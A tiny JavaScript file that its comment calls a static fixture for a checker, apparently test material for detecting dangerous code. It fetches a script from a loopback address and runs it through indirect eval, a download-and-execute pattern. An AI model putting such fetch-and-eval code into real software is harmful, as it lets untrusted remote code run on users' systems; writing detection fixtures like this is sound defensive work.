// Downloads a remote script and evaluates it. Static fixture: the checker only
// reads this file, it is never executed.
const res = await fetch('http://127.0.0.1:9/payload.mjs')
const code = await res.text()
;(0, eval)(code)
